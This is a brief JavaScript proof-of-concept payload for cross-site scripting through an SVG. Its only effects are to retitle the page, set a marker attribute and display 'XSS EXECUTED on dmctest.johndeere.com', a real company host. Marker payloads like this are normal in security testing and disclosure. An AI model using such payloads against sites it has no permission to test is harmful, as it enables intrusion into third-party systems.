document.title = "CODEX-SVG-EXECUTED";
document.documentElement.setAttribute("data-codex-svg-executed", "1");

function showProof() {
  const background = document.getElementById("proof-background");
  const status = document.getElementById("proof-status");
  if (background) background.setAttribute("fill", "#ffe8e8");
  if (status) {
    status.textContent = "XSS EXECUTED on dmctest.johndeere.com";
    status.setAttribute("fill", "#b00020");
    status.setAttribute("font-weight", "bold");
  }
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", showProof, { once: true });
} else {
  showProof();
}
